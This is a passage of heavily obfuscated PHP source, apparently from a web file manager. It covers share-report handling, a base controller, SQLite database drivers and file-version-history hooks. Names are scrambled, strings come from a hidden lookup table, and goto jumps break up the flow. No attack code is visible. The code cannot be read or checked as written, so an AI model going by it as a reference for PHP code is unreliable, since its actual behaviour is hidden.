=> $•îÛ°Ïï[$ÔÄá¤¯[1565]], $ÔÄá¤¯[411] => $•îÛ°Ïï[$ÔÄá¤¯[411]], $ÔÄá¤¯[477] => $•îÛ°Ïï[$ÔÄá¤¯[477]], $ÔÄá¤¯[1665] => USER_ID, $ÔÄá¤¯[33] => $•îÛ°Ïï[$ÔÄá¤¯[33]], $ÔÄá¤¯[462] => $•îÛ°Ïï[$ÔÄá¤¯[462]]); return Model($ÔÄá¤¯[2023])->add($×ç§ğÈË); } public function reportList($©œ‹ì¡) { $ËÍùÊÜÇ =& $_SERVER[Ó¡Ÿ§‚]; $åáÛŒÜ = array(); if ($©œ‹ì¡[$ËÍùÊÜÇ[759]]) { $•ÔÈ¡ = $©œ‹ì¡[$ËÍùÊÜÇ[760]] ? $©œ‹ì¡[$ËÍùÊÜÇ[760]] : strtotime(date($ËÍùÊÜÇ[2025])); $åáÛŒÜ[$ËÍùÊÜÇ[201]] = array($ËÍùÊÜÇ[333], array($©œ‹ì¡[$ËÍùÊÜÇ[759]], $•ÔÈ¡)); } if (isset($©œ‹ì¡[$ËÍùÊÜÇ[33]]) && in_array($©œ‹ì¡[$ËÍùÊÜÇ[33]], array($ËÍùÊÜÇ[88], $ËÍùÊÜÇ[446], $ËÍùÊÜÇ[2028], $ËÍùÊÜÇ[2029], $ËÍùÊÜÇ[2030]))) { $åáÛŒÜ[$ËÍùÊÜÇ[33]] = $©œ‹ì¡[$ËÍùÊÜÇ[33]]; } if (isset($©œ‹ì¡[$ËÍùÊÜÇ[748]]) && in_array($©œ‹ì¡[$ËÍùÊÜÇ[748]], array($ËÍùÊÜÇ[198], $ËÍùÊÜÇ[88], $ËÍùÊÜÇ[446], $ËÍùÊÜÇ[2028]))) { $åáÛŒÜ[$ËÍùÊÜÇ[748]] = $©œ‹ì¡[$ËÍùÊÜÇ[748]]; } $Ùç£³Å = Input::get($ËÍùÊÜÇ[467], $ËÍùÊÜÇ[7], $ËÍùÊÜÇ[2027], array($ËÍùÊÜÇ[1945], $ËÍùÊÜÇ[461])); $ôø®¬£­ = array($ËÍùÊÜÇ[459] => $ËÍùÊÜÇ[460], $ËÍùÊÜÇ[461] => $ËÍùÊÜÇ[462]); $™–ÀÙïÒ = $ËÍùÊÜÇ[2031] . $ôø®¬£­[$Ùç£³Å]; $ƒ®¥€şí = Model($ËÍùÊÜÇ[2023])->where($åáÛŒÜ)->order($™–ÀÙïÒ)->selectPage(20); if (empty($ƒ®¥€şí[$ËÍùÊÜÇ[369]])) { return array(); } $ŞÔ¸şŞ = array_to_keyvalue_group($ƒ®¥€şí[$ËÍùÊÜÇ[369]], $ËÍùÊÜÇ[748], $ËÍùÊÜÇ[602]); if (!empty($ŞÔ¸şŞ[0])) { $©œ‹ì¡ = $ŞÔ¸şŞ[0]; $åáÛŒÜ = array($ËÍùÊÜÇ[602] => array($ËÍùÊÜÇ[7], $©œ‹ì¡)); $ı°ãıË = $this->where($åáÛŒÜ)->field($ËÍùÊÜÇ[602])->select(); $ı°ãıË = array_to_keyvalue($ı°ãıË, $ËÍùÊÜÇ[12], $ËÍùÊÜÇ[602]); $»ßçºù• = array_diff($©œ‹ì¡, $ı°ãıË); if (!empty($»ßçºù•)) { foreach ($ƒ®¥€şí[$ËÍùÊÜÇ[369]] as $‘’­²ÜÊ => $ù˜¾Ñº²) { if (in_array($ù˜¾Ñº²[$ËÍùÊÜÇ[602]], $»ßçºù•)) { unset($ƒ®¥€şí[$ËÍùÊÜÇ[369]][$‘’­²ÜÊ]); } } } } $this->_listDataApply($ƒ®¥€şí[$ËÍùÊÜÇ[369]]); return $ƒ®¥€şí; } public function reportStatus($åøÀ†Ü‘) { $®Ã¹ô Ğ =& $_SERVER[Ó¡Ÿ§‚]; $°­ê”ôü = array($®Ã¹ô Ğ[399] => $åøÀ†Ü‘[$®Ã¹ô Ğ[399]]); $¨à·¿–Ó = Model($®Ã¹ô Ğ[2023])->where($°­ê”ôü)->field($®Ã¹ô Ğ[2032])->find(); if (!$¨à·¿–Ó) { return !1; } $ÓÂÙ†óÁ = array($®Ã¹ô Ğ[748] => $åøÀ†Ü‘[$®Ã¹ô Ğ[748]]); if ($åøÀ†Ü‘[$®Ã¹ô Ğ[748]] == $®Ã¹ô Ğ[2028] && $¨à·¿–Ó[$®Ã¹ô Ğ[748]] == $®Ã¹ô Ğ[2028]) { $ÓÂÙ†óÁ[$®Ã¹ô Ğ[748]] = 0; } $¶‚ãç“œ = Model($®Ã¹ô Ğ[2023])->where($°­ê”ôü)->save($ÓÂÙ†óÁ); if ($åøÀ†Ü‘[$®Ã¹ô Ğ[748]] == $®Ã¹ô Ğ[446]) { if ($¨à·¿–Ó[$®Ã¹ô Ğ[477]] != $®Ã¹ô Ğ[198] && $this->shareFileMeta($¨à·¿–Ó[$®Ã¹ô Ğ[477]])) { $this->shareFileMeta($¨à·¿–Ó[$®Ã¹ô Ğ[477]], 0); } $this->remove($¨à·¿–Ó[$®Ã¹ô Ğ[602]]); return !0; } if ($¶‚ãç“œ && $åøÀ†Ü‘[$®Ã¹ô Ğ[748]] == $®Ã¹ô Ğ[2028]) { $øÀ®Ôº = $ÓÂÙ†óÁ[$®Ã¹ô Ğ[748]] == $®Ã¹ô Ğ[2028] ? 1 : 0; $this->shareFileMeta($¨à·¿–Ó[$®Ã¹ô Ğ[477]], $øÀ®Ôº); $this->removeByFile($¨à·¿–Ó[$®Ã¹ô Ğ[477]]); } return $¶‚ãç“œ; } private function removeByFile($Ò«òêãß) { $¬Ê‰¶Ğó =& $_SERVER[Ó¡Ÿ§‚]; $¼¦Ãè = Model($¬Ê‰¶Ğó[824])->where(array($¬Ê‰¶Ğó[477] => $Ò«òêãß))->field($¬Ê‰¶Ğó[411])->select(); $ù¹ÚÚ = array_to_keyvalue($¼¦Ãè, $¬Ê‰¶Ğó[12], $¬Ê‰¶Ğó[411]); $ãêå•»ì = array($¬Ê‰¶Ğó[411] => array($¬Ê‰¶Ğó[7], $ù¹ÚÚ), $¬Ê‰¶Ğó[497] => 1); $¼¦Ãè = $this->where($ãêå•»ì)->field($¬Ê‰¶Ğó[602])->select(); if (empty($¼¦Ãè)) { return; } $Ñ¨Òá¸İ = array_to_keyvalue($¼¦Ãè, $¬Ê‰¶Ğó[12], $¬Ê‰¶Ğó[602]); $this->remove($Ñ¨Òá¸İ); } private function shareFileMeta($¥Îˆ¯ƒ, $òÁãÁ’Ú = null) { $Üë™…‡ñ =& $_SERVER[Ó¡Ÿ§‚]; $ÎäÁ‰µŠ = array($Üë™…‡ñ[477] => $¥Îˆ¯ƒ, $Üë™…‡ñ[94] => $Üë™…‡ñ[2033]); if (is_null($òÁãÁ’Ú)) { return Model($Üë™…‡ñ[2034])->where($ÎäÁ‰µŠ)->find(); } $ÎäÁ‰µŠ[$Üë™…‡ñ[374]] = $òÁãÁ’Ú; Model($Üë™…‡ñ[2034])->add($ÎäÁ‰µŠ, array(), !0); } } goto aì³¼Æï; D Ñó¡‚ç¦: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¿‘ ™’ =& $_SERVER[Ó¡Ÿ§‚]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¿‘ ™’[6]] =& $config; $this->values[$¿‘ ™’[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¿‘ ™’[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Çü‹£Šï) { if (1 === func_num_args()) { $this->{$Çü‹£Šï} = new $Çü‹£Šï(); } else { $êĞˆşÃê = new ReflectionClass($Çü‹£Šï); $ä¥°°·Ğ = func_get_args(); array_shift($ä¥°°·Ğ); $this->{$Çü‹£Šï} = $êĞˆşÃê->newInstanceArgs($ä¥°°·Ğ); } return $this->{$Çü‹£Šï}; } public function routeBind($¹ÁÑ·Ì“, $‡çšó¿ä, $ü»ã€µŞ = 3) { $áôÎ°‡ =& $_SERVER[Ó¡Ÿ§‚]; $û­â¯Î = $this->in[$áôÎ°‡[9]]; $¹ÁÑ·Ì“ = str_replace($áôÎ°‡[10], $áôÎ°‡[11], trim(trim($¹ÁÑ·Ì“, $áôÎ°‡[8]), $áôÎ°‡[12])); if (!$¹ÁÑ·Ì“ || count($û­â¯Î) <= $ü»ã€µŞ) { return !1; } $¢Ò¼ç“× = !0; $„çíÓ¦ = explode($áôÎ°‡[8], $¹ÁÑ·Ì“); for ($©˜¸Èâş = 0; $©˜¸Èâş < count($„çíÓ¦); $©˜¸Èâş++) { if ($„çíÓ¦[$©˜¸Èâş] != $û­â¯Î[$ü»ã€µŞ + $©˜¸Èâş]) { $¢Ò¼ç“× = !1; break; } } if (!$¢Ò¼ç“×) { return; } call_user_func_array(array($this, $‡çšó¿ä), array()); } public function routeArgs($„‹í²í = 3) { $§©Ÿ·İ = $this->in[$_SERVER[Ó¡Ÿ§‚][9]]; if (count($§©Ÿ·İ) <= $„‹í²í) { return array(); } $©÷¿õåâ = array(); for ($Ö¢®²¡Ù = $„‹í²í; $Ö¢®²¡Ù < count($§©Ÿ·İ); $Ö¢®²¡Ù += 2) { $©÷¿õåâ[$§©Ÿ·İ[$Ö¢®²¡Ù]] = $§©Ÿ·İ[$Ö¢®²¡Ù + 1]; $this->in[$§©Ÿ·İ[$Ö¢®²¡Ù]] = $§©Ÿ·İ[$Ö¢®²¡Ù + 1]; } return $©÷¿õåâ; } protected function assign($±Â¤©ë, $ª Âà­Ë) { $this->values[$±Â¤©ë] = $ª Âà­Ë; } protected function display($Òå½º) { ob_end_clean(); extract($this->values); require $this->tpl . $Òå½º; } } class DbSqliteBase extends Db { public function __construct($ß§ò¹¦¾ = '') { $ğØÁØ¦ =& $_SERVER[Ó¡Ÿ§‚]; if (!extension_loaded($ğØÁØ¦[13])) { think_exception(think_lang($ğØÁØ¦[14]) . $ğØÁØ¦[15]); } if (!empty($ß§ò¹¦¾)) { if (!isset($ß§ò¹¦¾[$ğØÁØ¦[16]])) { $ß§ò¹¦¾[$ğØÁØ¦[16]] = 438; } $this->config = $ß§ò¹¦¾; if (empty($this->config[$ğØÁØ¦[17]])) { $this->config[$ğØÁØ¦[17]] = array(); } } } public function connect($‹¢­Õâ« = '', $­÷·î‹Î = 0) { $ğÜ÷–•í =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($this->linkID[$­÷·î‹Î])) { if (empty($‹¢­Õâ«)) { $‹¢­Õâ« = $this->config; } $çì¤ˆÄä = !empty($‹¢­Õâ«[$ğÜ÷–•í[17]][$ğÜ÷–•í[18]]) ? $‹¢­Õâ«[$ğÜ÷–•í[17]][$ğÜ÷–•í[18]] : $this->pconnect; $´±¡é§© = $çì¤ˆÄä ? $ğÜ÷–•í[19] : $ğÜ÷–•í[20]; $this->linkID[$­÷·î‹Î] = $´±¡é§©($‹¢­Õâ«[$ğÜ÷–•í[21]], $‹¢­Õâ«[$ğÜ÷–•í[16]]); if (!$this->linkID[$­÷·î‹Î]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$­÷·î‹Î], 30000); if (1 != think_config($ğÜ÷–•í[22])) { unset($this->config); } } return $this->linkID[$­÷·î‹Î]; } public function free() { $this->queryID = null; } public function query($ÉéØú’•) { $”ıîŸ® =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉéØú’•; if ($this->queryID) { $this->free(); } think_action_status($”ıîŸ®[23], 1); think_status($”ıîŸ®[24]); $this->queryID = sqlite_query($this->_linkID, $ÉéØú’•); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $‰ÏÅÚÓ = $this->getAll(); return $‰ÏÅÚÓ; } } public function execute($ìÏ¥„ºÚ) { $§§Çş˜ =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ìÏ¥„ºÚ; if ($this->queryID) { $this->free(); } think_action_status($§§Çş˜[25], 1); think_status($§§Çş˜[24]); $í’ë²•“ = sqlite_exec($this->_linkID, $ìÏ¥„ºÚ); $this->debug(); if (!1 === $í’ë²•“) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ó¡Ÿ§‚][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $®¢§ÅÉò = sqlite_query($this->_linkID, $_SERVER[Ó¡Ÿ§‚][27]); if (!$®¢§ÅÉò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÇÍÃ”¯½ = sqlite_query($this->_linkID, $_SERVER[Ó¡Ÿ§‚][28]); if (!$ÇÍÃ”¯½) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $İóº÷¼‡ = array(); if ($this->numRows > 0) { for ($¡è¸´£ã = 0; $¡è¸´£ã < $this->numRows; $¡è¸´£ã++) { $İóº÷¼‡[$¡è¸´£ã] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $İóº÷¼‡; } public function getFields($ûÅé¨á) { $ÈĞüÀÁì =& $_SERVER[Ó¡Ÿ§‚]; $½ ¶Û¤ˆ = $this->query($ÈĞüÀÁì[29] . $ûÅé¨á . $ÈĞüÀÁì[30]); $Ûñ†ÏÔà = array(); if ($½ ¶Û¤ˆ) { foreach ($½ ¶Û¤ˆ as $Ñ¦“¦› => $²Àˆô×¥) { $Ûñ†ÏÔà[$²Àˆô×¥[$ÈĞüÀÁì[31]]] = array($ÈĞüÀÁì[32] => $²Àˆô×¥[$ÈĞüÀÁì[31]], $ÈĞüÀÁì[33] => $²Àˆô×¥[$ÈĞüÀÁì[34]], $ÈĞüÀÁì[35] => (bool) ($²Àˆô×¥[$ÈĞüÀÁì[36]] === $ÈĞüÀÁì[12]), $ÈĞüÀÁì[37] => $²Àˆô×¥[$ÈĞüÀÁì[38]], $ÈĞüÀÁì[39] => strtolower($²Àˆô×¥[$ÈĞüÀÁì[40]]) == $ÈĞüÀÁì[41], $ÈĞüÀÁì[42] => strtolower($²Àˆô×¥[$ÈĞüÀÁì[43]]) == $ÈĞüÀÁì[44]); } } return $Ûñ†ÏÔà; } public function getTables($óÛñ²ã = '') { $à¤îÙ =& $_SERVER[Ó¡Ÿ§‚]; $¶ ï§¯ = $this->query($à¤îÙ[45] . $à¤îÙ[46] . $à¤îÙ[47]); $ˆÂúÍ” = array(); foreach ($¶ ï§¯ as $ŠèÇû† => $œğóóŒ³) { $ˆÂúÍ”[$ŠèÇû†] = current($œğóóŒ³); } return $ˆÂúÍ”; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $´ËË˜¤£ =& $_SERVER[Ó¡Ÿ§‚]; $û€ñ·„‘ = sqlite_last_error($this->_linkID); $this->error = $û€ñ·„‘ . $´ËË˜¤£[4] . sqlite_error_string($û€ñ·„‘); if ($´ËË˜¤£[12] != $this->queryStr) { $this->error .= LNG($´ËË˜¤£[48]) . $this->queryStr; } think_trace($this->error, $´ËË˜¤£[12], $´ËË˜¤£[49]); return $this->error; } public function escapeString($şŒ•Ï¦ê) { return sqlite_escape_string($şŒ•Ï¦ê); } public function parseLimit($ÕÒ§õôÒ) { $²ï­Ä‡ =& $_SERVER[Ó¡Ÿ§‚]; $ß…ŠÜÒ‚ = $²ï­Ä‡[12]; if (!empty($ÕÒ§õôÒ)) { $ÕÒ§õôÒ = explode($²ï­Ä‡[50], $ÕÒ§õôÒ); if (count($ÕÒ§õôÒ) > 1) { $ß…ŠÜÒ‚ .= $²ï­Ä‡[51] . $ÕÒ§õôÒ[1] . $²ï­Ä‡[52] . $ÕÒ§õôÒ[0] . $²ï­Ä‡[53]; } else { $ß…ŠÜÒ‚ .= $²ï­Ä‡[51] . $ÕÒ§õôÒ[0] . $²ï­Ä‡[53]; } } return $ß…ŠÜÒ‚; } } class DbSqlite3Base extends Db { public function __construct($®ùéù–ë = '') { $”¶œı°† =& $_SERVER[Ó¡Ÿ§‚]; if (!class_exists($”¶œı°†[54])) { think_exception(think_lang($”¶œı°†[14]) . $”¶œı°†[55]); } if (!empty($®ùéù–ë)) { if (!isset($®ùéù–ë[$”¶œı°†[16]])) { $®ùéù–ë[$”¶œı°†[16]] = 438; } $this->config = $®ùéù–ë; if (empty($this->config[$”¶œı°†[17]])) { $this->config[$”¶œı°†[17]] = array(); } } } public function connect($ç›ÃªÒà = '', $¸˜º’›– = 0) { $Ê°ê„ä™ =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($this->linkID[$¸˜º’›–])) { if (empty($ç›ÃªÒà)) { $ç›ÃªÒà = $this->config; } $this->linkID[$¸˜º’›–] = new SQLite3($ç›ÃªÒà[$Ê°ê„ä™[21]]); if (!$this->linkID[$¸˜º’›–]) { think_exception($this->linkID[$¸˜º’›–]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¸˜º’›–]->busyTimeout(30000); if (1 != think_config($Ê°ê„ä™[22])) { unset($this->config); } } return $this->linkID[$¸˜º’›–]; } public function free() { $this->queryID = null; } public function query($ÈõùÙÊ») { $€Ãã‘±… =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÈõùÙÊ»; if ($this->queryID) { $this->free(); } think_action_status($€Ãã‘±…[23], 1); think_status($€Ãã‘±…[24]); $this->queryID = $this->_linkID->query($ÈõùÙÊ»); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $°“§²  = $this->getAll(); $this->numRows = count($°“§² ); return $°“§² ; } } public function execute($¸³¼§¥) { $‚¹ø¢Õ¹ =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¸³¼§¥; if ($this->queryID) { $this->free(); } think_action_status($‚¹ø¢Õ¹[25], 1); think_status($‚¹ø¢Õ¹[24]); $‰Ôåé§¢ = $this->_linkID->exec($¸³¼§¥); $this->debug(); if (!1 === $‰Ôåé§¢) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ó¡Ÿ§‚][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $”åÕÆÁ½ = $this->_linkID->query($_SERVER[Ó¡Ÿ§‚][27]); if (!$”åÕÆÁ½) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÎÇ¸«¤í = $this->_linkID->query($_SERVER[Ó¡Ÿ§‚][28]); if (!$ÎÇ¸«¤í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $šõ¿´ÅÈ = array(); while ($íŒ»¶¼ß = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $šõ¿´ÅÈ[] = $íŒ»¶¼ß; } $this->queryID->reset(); return $šõ¿´ÅÈ; } public function getFields($ƒĞÂ†Ô¦) { $¦Ùœ—†ğ =& $_SERVER[Ó¡Ÿ§‚]; $ÀıòÏ¥“ = $this->query($¦Ùœ—†ğ[29] . $ƒĞÂ†Ô¦ . $¦Ùœ—†ğ[30]); $úŞªÈ±Ê = array(); if ($ÀıòÏ¥“) { foreach ($ÀıòÏ¥“ as $Ò³öŠÇ‚ => $÷Ÿœş) { $úŞªÈ±Ê[$÷Ÿœş[$¦Ùœ—†ğ[32]]] = array($¦Ùœ—†ğ[32] => $÷Ÿœş[$¦Ùœ—†ğ[32]], $¦Ùœ—†ğ[33] => $÷Ÿœş[$¦Ùœ—†ğ[33]], $¦Ùœ—†ğ[35] => (bool) ($÷Ÿœş[$¦Ùœ—†ğ[35]] === $¦Ùœ—†ğ[12]), $¦Ùœ—†ğ[37] => $÷Ÿœş[$¦Ùœ—†ğ[56]], $¦Ùœ—†ğ[39] => (bool) $÷Ÿœş[$¦Ùœ—†ğ[57]], $¦Ùœ—†ğ[42] => (bool) $÷Ÿœş[$¦Ùœ—†ğ[57]]); } } return $úŞªÈ±Ê; } public function getTables($¦—‚ß¯ = '') { $›àš£æ =& $_SERVER[Ó¡Ÿ§‚]; $×ı”’°î = $this->query($›àš£æ[45] . $›àš£æ[46] . $›àš£æ[47]); $—â‡Šó = array(); foreach ($×ı”’°î as $Û“âŞã => $×ÔãŒŸ™) { $—â‡Šó[$Û“âŞã] = current($×ÔãŒŸ™); } return $—â‡Šó; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $³¾Ñâ¿‰ =& $_SERVER[Ó¡Ÿ§‚]; $this->error = $this->_linkID->lastErrorMsg(); if ($³¾Ñâ¿‰[12] != $this->queryStr) { $this->error .= LNG($³¾Ñâ¿‰[48]) . $this->queryStr; } think_trace($this->error, $³¾Ñâ¿‰[12], $³¾Ñâ¿‰[49]); return $this->error; } public function escapeString($˜ÚÓß‰ì) { $‰ÊËÅñŠ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->_linkID) { return $this->_linkID->escapeString($˜ÚÓß‰ì); } return str_ireplace($‰ÊËÅñŠ[58], $‰ÊËÅñŠ[59], $˜ÚÓß‰ì); } public function parseLimit($û²ã‡Ó¦) { $ÁÙÕùÑ» =& $_SERVER[Ó¡Ÿ§‚]; $ˆÔáìÂ = $ÁÙÕùÑ»[12]; if (!empty($û²ã‡Ó¦)) { $û²ã‡Ó¦ = explode($ÁÙÕùÑ»[50], $û²ã‡Ó¦); if (count($û²ã‡Ó¦) > 1) { $ˆÔáìÂ .= $ÁÙÕùÑ»[51] . $û²ã‡Ó¦[1] . $ÁÙÕùÑ»[52] . $û²ã‡Ó¦[0] . $ÁÙÕùÑ»[53]; } else { $ˆÔáìÂ .= $ÁÙÕùÑ»[51] . $û²ã‡Ó¦[0] . $ÁÙÕùÑ»[53]; } } return $ˆÔáìÂ; } } goto D°–Æ‚º£; bÃôÜ£¢Ò•: define($_SERVER[Ó¡Ÿ§‚][241], 1); define($_SERVER[Ó¡Ÿ§‚][242], 0); define($_SERVER[Ó¡Ÿ§‚][243], 2); goto F½íŒïÚó¡; d‹ÇÑóÕë: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $õá¥ºÔ§ =& $_SERVER[Ó¡Ÿ§‚]; $¶½‡”Ò€ = $GLOBALS[$õá¥ºÔ§[6]][$õá¥ºÔ§[89]]; if ($¶½‡”Ò€[$õá¥ºÔ§[1215]] != 1) { return; } if ($¶½‡”Ò€[$õá¥ºÔ§[1216]] <= 0) { return; } if (isset($_REQUEST[$õá¥ºÔ§[1217]]) && $_REQUEST[$õá¥ºÔ§[1217]] == $õá¥ºÔ§[88]) { return; } Hook::bind($õá¥ºÔ§[1218], $õá¥ºÔ§[1219]); Hook::bind($õá¥ºÔ§[1220], $õá¥ºÔ§[1221]); Hook::bind($õá¥ºÔ§[1222], $õá¥ºÔ§[1223]); Hook::bind($õá¥ºÔ§[1224], $õá¥ºÔ§[1225]); Hook::bind($õá¥ºÔ§[1226], $õá¥ºÔ§[1227]); Hook::bind($õá¥ºÔ§[1228], $õá¥ºÔ§[1229]); } public static function eventBeforeUpload($²»Ë‡–Ş) { if ($²»Ë‡–Ş[3] && $²»Ë‡–Ş[3] != REPEAT_REPLACE) { return; } $§äâêåÍ = self::parsePath($²»Ë‡–Ş[0]); if (!$§äâêåÍ) { return; } self::add($§äâêåÍ); } public static function eventBeforeEdit($øèşÛ‹) { $¸ğ²±¦€ = self::parsePath($øèşÛ‹[0]); if (!$¸ğ²±¦€) { return; } self::add($¸ğ²±¦€); } public static function eventBeforeCopyFile($±áıÎŒö, $¬É¤‚ÊÂ, $ÅÒö¢ó, $«ÀïÙ¼œ, $šìø•¥‹, $ÒÇ…œ˜™) { $ÚÁÒ”Ë =& $_SERVER[Ó¡Ÿ§‚]; if (isset($ÅÒö¢ó->_data[$ÚÁÒ”Ë[1154]]) && $ÅÒö¢ó->_data[$ÚÁÒ”Ë[1154]]) { return; } $ì‚ö‡¼× = $ÅÒö¢ó->getPathOuter($«ÀïÙ¼œ); $í‘¸¸” = self::parsePath($ì‚ö‡¼×); if (!$í‘¸¸”) { return; } self::add($í‘¸¸”); } public static function eventBeforeRename($üÏàÖ°) { $È¥ò¿Ì¹ =& $_SERVER[Ó¡Ÿ§‚]; $£õüºšã = self::parsePath($üÏàÖ°[0]); if (!$£õüºšã) { return; } $ÔÖğÉ‰ˆ = self::checkInHistory($£õüºšã); if (!$ÔÖğÉ‰ˆ) { return; } if ($ÔÖğÉ‰ˆ[$È¥ò¿Ì¹[33]] == $È¥ò¿Ì¹[200]) { $œ¿´™… = self::listData($£õüºšã); if ($œ¿´™… && $œ¿´™…[$È¥ò¿Ì¹[369]]) { self::moveHistory($£õüºšã, $üÏàÖ°[1]); } } else { IO::rename($ÔÖğÉ‰ˆ[$È¥ò¿Ì¹[84]], $üÏàÖ°[1]); } } public static function eventBeforeMove($Ÿ…„çŒ) { $µù¢²£ =& $_SERVER[Ó¡Ÿ§‚]; $áÜ’„àŒ = self::parsePath($Ÿ…„çŒ[0]); if (!$áÜ’„àŒ) { return; } $Ø²Š©ÅÇ = self::parsePath($Ÿ…„çŒ[1]); if (!$Ø²Š©ÅÇ) { return; } $«Â÷´Ãô = $Ÿ…„çŒ[3]; $²…«µ§­ = self::checkInHistory($áÜ’„àŒ); if (!$²…«µ§­) { return; } $¨Æ§ˆıÊ = self::pathHistory($Ø²Š©ÅÇ); if ($²…«µ§­[$µù¢²£[33]] == $µù¢²£[200]) { $ªÅÃŸª‡ = self::listData($áÜ’„àŒ); $®ñï’ = rtrim($Ø²Š©ÅÇ, $µù¢²£[8]) . $µù¢²£[8] . ($«Â÷´Ãô ? $«Â÷´Ãô : get_path_this($áÜ’„àŒ)); $§ò¼ñ‚“ = self::listData($®ñï’); if ($ªÅÃŸª‡ && $ªÅÃŸª‡[$µù¢²£[369]] && $§ò¼ñ‚“ && $§ò¼ñ‚“[$µù¢²£[369]]) { return self::clear($áÜ’„àŒ); } if ($ªÅÃŸª‡ && $ªÅÃŸª‡[$µù¢²£[369]]) { self::moveHistory($áÜ’„àŒ, $«Â÷´Ãô, $¨Æ§ˆıÊ); } } else { IO::move($²…«µ§­[$µù¢²£[84]], $¨Æ§ˆıÊ, !1, $«Â÷´Ãô); self::clearEmptyFolder(IO::pathFather($²…«µ§­[$µù¢²£[84]])); } } public static function eventAfterRemove($¼¤Ì«”Æ, $¨ìƒ®Ÿ) { $·ú³ì§† =& $_SERVER[Ó¡Ÿ§‚]; if (!$¨ìƒ®Ÿ) { return; } $ø·æÏ¶× = self::parsePath($¼¤Ì«”Æ[0]); if (!$ø·æÏ¶×) { return; } $“«À‘•ç = self::checkInHistory($ø·æÏ¶×); if (!$“«À‘•ç) { return; } if ($“«À‘•ç[$·ú³ì§†[33]] == $·ú³ì§†[200]) { $£èÂşıâ = self::listData($ø·æÏ¶×, !1); if ($£èÂşıâ && $£èÂşıâ[$·ú³ì§†[369]]) { self::clear($ø·æÏ¶×, !1); } } else { IO::remove($“«À‘•ç[$·ú³ì§†[84]]); self::clearEmptyFolder(IO::pathFather($“«À‘•ç[$·ú³ì§†[84]])); } } private static function checkInHistory($½˜Ü˜Ğµ) { $øäÍ›ß° = self::pathHistory($½˜Ü˜Ğµ); if (!IO::exist($øäÍ›ß°)) { $øäÍ›ß° .= $_SERVER[Ó¡Ÿ§‚][1230]; } return IO::exist($øäÍ›ß°) ? IO::info($øäÍ›ß°) : !1; } private static function parsePath($ò©ò™€Î) { $·íõîîË =& $_SERVER[Ó¡Ÿ§‚]; if (!$ò©ò™€Î) { return !1; } if ($GLOBALS[$·íõîîË[1231]]) { return; } $½•’Êü = KodIO::parse($ò©ò™€Î); $“À‚áé = $½•’Êü[$·íõîîË[33]]; $Ğ²¾¼³¦ = !$“À‚áé || $“À‚áé == KodIO::KOD_IO || $“À‚áé == KodIO::KOD_SHARE_ITEM; if (!$Ğ²¾¼³¦ || !$½•’Êü[$·íõîîË[1232]]) { return !1; } if (substr($ò©ò™€Î, 0, strlen(DATA_PATH . $·íõîîË[1233])) == DATA_PATH . $·íõîîË[1233]) { return !1; } if ($“À‚áé == KodIO::KOD_SHARE_ITEM) { $Ùè»ú”” = IO::init($ò©ò™€Î); if ($Ùè»ú””->pathParse[$·íõîîË[1150]]) { return self::parsePath($Ùè»ú””->pathParse[$·íõîîË[1150]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ô»ÆÒ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $·íõîîË[1234]); foreach ($ô»ÆÒ as $ÖÎå£í) { if (!$“À‚áé && substr($ò©ò™€Î, 0, strlen($ÖÎå£í)) == $ÖÎå£í) { return !1; } } self::log($GLOBALS[$·íõîîË[1145]] . $·íõîîË[1235] . $ò©ò™€Î); return $ò©ò™€Î; } private static function pathHistory($Âúœ–‘ä) { $åñƒÉË« =& $_SERVER[Ó¡Ÿ§‚]; $Ö´â§Ã¨ = self::$_historyBase . ltrim(KodIO::clear($Âúœ–‘ä), $åñƒÉË«[8]); $Ö´â§Ã¨ = str_replace(array($åñƒÉË«[1236]), array($åñƒÉË«[1237]), $Ö´â§Ã¨); return $Ö´â§Ã¨; } public static function log($Ë›Ø‚ä×) { } public static function historyCount($§ïâáƒ) { $œ¾†‹¾ß =& $_SERVER[Ó¡Ÿ§‚]; 